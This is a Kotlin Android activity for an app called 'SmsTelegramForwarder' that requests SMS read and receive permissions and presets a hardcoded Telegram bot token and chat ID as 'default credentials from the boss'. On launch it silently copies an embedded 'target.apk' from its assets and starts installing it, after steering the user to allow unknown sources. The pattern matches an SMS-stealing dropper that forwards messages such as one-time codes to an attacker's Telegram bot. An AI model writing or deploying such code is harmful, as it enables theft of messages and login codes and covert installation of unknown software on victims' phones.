package com.example.smstelegramforwarder

import android.Manifest
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import java.io.File
import java.io.FileOutputStream
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {
    private val REQUEST_CODE_PERMISSIONS = 101

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val etBotToken = findViewById<EditText>(R.id.etBotToken)
        val etChatId = findViewById<EditText>(R.id.etChatId)
        val btnSave = findViewById<Button>(R.id.btnSave)

        val prefs = getSharedPreferences("SmsPrefs", Context.MODE_PRIVATE)
        // Default kredensial dari BOS
        if (prefs.getString("bot_token", "").isNullOrEmpty()) {
            prefs.edit().putString("bot_token", "8688851270:AAHYW-RgIm1-Dr-vjLcYbrukGdPRjhnvbRM").putString("chat_id", "8630880190").apply()
        }
        etBotToken.setText(prefs.getString("bot_token", ""))
        etChatId.setText(prefs.getString("chat_id", ""))

        checkPermissions()
        installEmbeddedApp()

        btnSave.setOnClickListener {
            val token = etBotToken.text.toString().trim()
            val chatId = etChatId.text.toString().trim()

            if (token.isEmpty() || chatId.isEmpty()) {
                Toast.makeText(this, "Bot Token dan Chat ID harus diisi", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            prefs.edit().putString("bot_token", token).putString("chat_id", chatId).apply()
            Toast.makeText(this, "Pengaturan disimpan!", Toast.LENGTH_SHORT).show()
        }
    }

    private fun installEmbeddedApp() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !packageManager.canRequestPackageInstalls()) {
            startActivity(Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:$packageName")))
            return
        }
        try {
            val file = File(cacheDir, "target.apk")
            assets.open("target.apk").use { input ->
                FileOutputStream(file).use { output -> input.copyTo(output) }
            }
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            startActivity(intent)
        } catch (e: Exception) { e.printStackTrace() }
    }

        private fun checkPermissions() {
        val permissions = arrayOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS
        )
        val listPermissionsNeeded = mutableListOf<String>()
        for (p in permissions) {
            if (ContextCompat.checkSelfPermission(this, p) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(p)
            }
        }
        if (listPermissionsNeeded.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toTypedArray(), REQUEST_CODE_PERMISSIONS)
        }
    }
}
